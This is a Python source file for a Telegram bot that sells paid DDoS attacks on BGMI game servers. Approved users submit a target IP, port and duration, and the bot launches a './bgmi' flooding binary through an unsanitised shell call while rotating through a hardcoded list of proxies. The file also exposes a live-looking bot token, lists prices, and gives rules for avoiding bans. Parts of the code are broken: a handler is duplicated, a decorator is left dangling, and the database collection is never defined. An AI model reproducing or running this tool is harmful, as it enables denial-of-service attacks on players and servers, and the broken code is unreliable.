import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from pprint import pprint

loop = asyncio.get_event_loop()

TOKEN = '6883868496:AAGCwgUcSPemWwU_FrAb0A4YK8m6QBjXiK4'

FORWARD_CHANNEL_ID = -1002208171994
CHANNEL_ID = -1002208171994
error_channel_id = -1002208171994

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 500")
    await process.communicate()

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Testing Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 9999:
                bot.send_message(chat_id, "*Approval failed: Testing Plan 🧡 limit reached (9999 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Premium Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 4999:
                bot.send_message(chat_id, "*Approval failed: Premium Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "You are not approved to use this bot. Please contact @WarriorsLab & @iconic00001.")
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 9999:
            bot.send_message(chat_id, "Your Testing Plan 🧡 is currently not available due to limit reached.")
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 4999:
            bot.send_message(chat_id, "Your Premium Plan 💥 is currently not available due to limit reached.")
            return

        bot.send_message(chat_id, "Enter the target IP, port, and duration (in seconds) separated by spaces.")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact @Warriors_King & @Iconic_Hack *", parse_mode='Markdown')
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 9999:
            bot.send_message(chat_id, "*Your Testing Plan 🧡 is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 4999:
            bot.send_message(chat_id, "*Your Premium Plan 💥 is currently not available due to limit reached.*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    # Create buttons
    btn1 = KeyboardButton("Testing Plan 🧡")
    btn2 = KeyboardButton("Premium Plan 💥")
    btn3 = KeyboardButton("Setup Process✔️")
    btn4 = KeyboardButton("Rules❓")
    btn5 = KeyboardButton("User Commands✔️")
    btn6 = KeyboardButton("Admin Commands✔️")

    # Add buttons to the markup
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)

    bot.send_message(message.chat.id, "*Welcome *", reply_markup=markup, parse_mode='Markdown')
    bot.send_message(message.chat.id, "*Any query DM @Warriors_King & @Iconic_Hack *", reply_markup=markup, parse_mode='Markdown')
    bot.send_message(message.chat.id, "*Must Follow Rules *", reply_markup=markup, parse_mode='Markdown')
    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "Testing Plan 🧡":
        bot.reply_to(message,"*1D-->120*",
            parse_mode = 'Markdown')
        bot.reply_to(message,"*3D-->320*",
            parse_mode = 'Markdown')
        bot.reply_to(message,"*7D --> 550*", parse_mode = 'Markdown')
        bot.reply_to(message,"*Contact to buy @Warriors_King & @Iconic_Hack*", parse_mode = 'Markdown')
    elif message.text == "Premium Plan 💥":
        bot.reply_to(message,"*15D --> 800*",parse_mode='Markdown')
        bot.reply_to(message,"*30D --> 1200*",parse_mode='Markdown')
        bot.reply_to(message, "*60D --> 2100*", parse_mode='Markdown')
        bot.reply_to(message,"*Contact to buy @Warriors_King & @Iconic_Hack*", parse_mode = 'Markdown')
    elif message.text == "Setup Process✔️":
        bot.reply_to(message,"*Please use the following link for Setup Process:   @WarriorsLabDdosSetup*", parse_mode='Markdown')
    elif message.text == "Rules❓":
        bot.reply_to(message, "*1. MUST FOLLOW RULES OTHERWISE YOU WILL KICKED BY OWNER*",
           parse_mode = 'Markdown')
        bot.reply_to(message, "*2. Min time 240 & Max time 300 seconds*",
           parse_mode = 'Markdown')
        bot.reply_to(message, "*3. Dont Run Too Many Attacks !! Cause A Ban From Bot*",
           parse_mode = 'Markdown')
        bot.reply_to(message, "*4. Dont run every match[Use it alternatively 1 match play use it and 2nd match dont use it.]*",
           parse_mode = 'Markdown')
        bot.reply_to(message, "*5. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.*",
           parse_mode = 'Markdown')
        bot.reply_to(message, "*6. We Daily Checks The Logs So Follow these rules to avoid Ban!!*",
           parse_mode = 'Markdown')
        bot.reply_to(message, "*7. If you don't follow rules then you conform get ban from our side and also BGMI Account.*",
        parse_mode = 'Markdown')
    elif message.text == "User Commands✔️":
        bot.reply_to(message, "* /Attack - For attack in BGMI*", parse_mode='Markdown')
    elif message.text == "Admin Commands✔️":
        bot.reply_to(message, "* /approve - Give Permissiom for use BOT*", parse_mode='Markdown')
        bot.reply_to(message, "* /disapprove - Remove Permissiom for use BOT*", parse_mode='Markdown')
        
        @bot.message_handler(commands=['list_users'])

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
